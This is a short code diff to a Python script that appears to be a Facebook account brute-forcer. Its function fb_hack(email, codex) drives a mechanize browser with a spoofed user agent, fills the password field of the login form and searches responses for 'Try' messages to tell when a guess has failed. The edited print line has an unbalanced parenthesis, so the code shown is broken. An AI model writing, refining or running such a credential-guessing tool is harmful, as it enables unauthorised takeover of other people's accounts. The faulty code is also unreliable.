@@ -5,6 +5,7 @@ from bs4 import BeautifulSoup
 import requests
 import mechanize
 import os
+import re
 CHRS = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
 
 MOZILLA_UAS = 'Mozilla/5.0 (X11; U; Linux i686; en-US) ' \
@@ -79,7 +80,7 @@ def fb_hack(email, codex):
     file.write(str(soup))
   response1 = browser.response()
   soup = BeautifulSoup(response1, 'html.parser')
-  print(soup.find_all())
+  print(soup.find_all(string=re.compile("Try"))
   browser.select_form(nr=0)
   browser.form['pass'] = str(1)
 os.system('clear')
